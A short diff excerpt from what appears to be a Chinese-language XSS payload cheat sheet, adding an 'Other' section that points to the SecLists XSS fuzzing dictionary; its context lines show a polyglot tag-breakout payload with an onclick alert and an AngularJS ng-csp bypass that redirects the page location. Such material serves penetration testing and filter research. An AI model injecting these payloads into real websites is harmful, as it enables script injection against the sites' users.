@@ -700,3 +700,9 @@ javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
 
 <div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
 ```
+
+# 其它
+
+XSS字典：
+
+[SecLists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS)
